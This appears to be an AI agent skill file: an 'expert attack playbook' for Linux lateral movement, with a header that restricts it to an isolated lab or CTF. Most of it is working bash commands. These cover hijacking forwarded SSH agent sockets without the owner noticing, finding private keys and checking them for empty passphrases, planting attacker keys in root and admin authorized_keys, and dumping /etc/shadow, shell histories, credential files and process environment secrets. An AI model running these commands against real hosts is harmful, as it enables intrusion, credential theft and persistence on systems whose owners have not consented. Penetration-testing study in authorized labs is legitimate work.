---
name: linux-lateral-movement
description: >-
  Linux lateral movement playbook. Use after gaining initial access to pivot across Linux hosts via SSH hijacking, credential harvesting, internal pivoting, D-Bus exploitation, sudo token reuse, and shared filesystem abuse.
---

# SKILL: Linux Lateral Movement — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert Linux lateral movement techniques. Covers SSH agent hijacking, key harvesting, credential locations, D-Bus exploitation, network pivoting, sudo token reuse, and systemd manipulation. Pay particular attention to SSH_AUTH_SOCK hijacking and ptrace-based sudo session hijack.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `linux-privilege-escalation` if you need root on the current host before pivoting
- `linux-security-bypass` when restricted shells or security modules block lateral movement tools
- `container-escape-techniques` when the target network includes containerized hosts
- `kubernetes-pentesting` when pivoting into a Kubernetes cluster
- `unauthorized-access-common-services` for exploiting discovered internal services (Redis, MongoDB, etc.)

---

## 1. SSH AGENT HIJACKING

### 1.1 Find SSH Agent Sockets

```bash
# As root (or user with access to other users' processes):
find /tmp -path "*/ssh-*" -name "agent.*" 2>/dev/null
# Or via /proc:
grep -r SSH_AUTH_SOCK /proc/*/environ 2>/dev/null | tr '\0' '\n'

# Typical path: /tmp/ssh-XXXXXX/agent.PID
```

### 1.2 Hijack Agent Forwarding

```bash
# Set the found socket as our auth agent
export SSH_AUTH_SOCK=/tmp/ssh-AbCdEf/agent.12345

# List available keys in the agent
ssh-add -l
# If keys appear → we can use them

# SSH to any host this agent can authenticate to
ssh -o StrictHostKeyChecking=no user@internal-host

# The agent owner won't notice — we're using their forwarded agent
```

### 1.3 Persistent Agent Monitoring

```bash
# Monitor for new SSH agent sockets (wait for admin to SSH in)
inotifywait -m /tmp -e create 2>/dev/null | grep ssh-
# Or poll:
while true; do
    find /tmp -path "*/ssh-*" -name "agent.*" -newer /tmp/.marker 2>/dev/null
    touch /tmp/.marker
    sleep 5
done
```

---

## 2. SSH KEY HARVESTING

### 2.1 Private Key Locations

```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" 2>/dev/null
# Also: /etc/ssh/ssh_host_*_key (MITM), /home/*/.ssh/id_*

# Find keys without passphrase:
for key in $(find / -name "id_*" ! -name "*.pub" 2>/dev/null); do
    ssh-keygen -y -P "" -f "$key" > /dev/null 2>&1 && echo "NO PASSPHRASE: $key"
done
```

### 2.2 known_hosts Parsing

```bash
# Hashed known_hosts (common default):
cat ~/.ssh/known_hosts
# May be hashed — use ssh-keygen to check against known IPs:
ssh-keygen -F 10.0.0.1 -f ~/.ssh/known_hosts

# Unhashed known_hosts → direct IP/hostname list
awk '{print $1}' ~/.ssh/known_hosts | sort -u

# Extract all hostnames/IPs from all users' known_hosts
cat /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null \
  | awk '{print $1}' | tr ',' '\n' | sort -u
```

### 2.3 authorized_keys Injection

```bash
# Generate attacker keypair (on attacker box)
ssh-keygen -t ed25519 -f /tmp/pivot_key -N ""

# Inject public key (on compromised host)
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> /root/.ssh/authorized_keys
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> /home/admin/.ssh/authorized_keys

# SSH back in with our key
ssh -i /tmp/pivot_key root@target
```

---

## 3. CREDENTIAL HARVESTING LOCATIONS

### 3.1 System Credentials

| Location | Contents | Command |
|---|---|---|
| `/etc/shadow` | Password hashes | `cat /etc/shadow` (root) |
| `/etc/passwd` | User list, may contain hashes | `cat /etc/passwd` |
| `.bash_history` | Command history (passwords in cleartext) | `cat /home/*/.bash_history` |
| `.mysql_history` | MySQL commands with passwords | `cat /home/*/.mysql_history` |
| `.psql_history` | PostgreSQL commands | `cat /home/*/.psql_history` |
| `.pgpass` | PostgreSQL password file | `cat /home/*/.pgpass` |
| `.my.cnf` | MySQL credentials | `cat /home/*/.my.cnf` |
| `.netrc` | FTP/HTTP auto-login credentials | `cat /home/*/.netrc` |
| `.git-credentials` | Git HTTPS passwords | `cat /home/*/.git-credentials` |

### 3.2 Environment & Config Files

```bash
# Current process secrets
env | grep -iE "pass|key|secret|token|api|cred|auth"

# All process environments (root):
for pid in /proc/[0-9]*; do
    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|key|secret|token"
done

# Application configs (common credential locations):
find /var/www /opt /srv -name "wp-config.php" -o -name "settings.py" \
     -o -name "*.env" -o -name "database.yml" -o -name "docker-compose.yml" 2>/dev/null

# Keyrings & secret stores:
find / -name "*.keyring" -o -name ".vault-token" -o -path "*/.password-store/*.gpg" 2>/dev/null
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 4. D-BUS EXPLOITATION
- 5. INTERNAL NETWORK PIVOTING
- 6. SHARED FILESYSTEM EXPLOITATION
- 7. SUDO TOKEN REUSE (ptrace-Based)
- 8. SYSTEMD SERVICE MANIPULATION
- 9. LATERAL MOVEMENT DECISION TREE
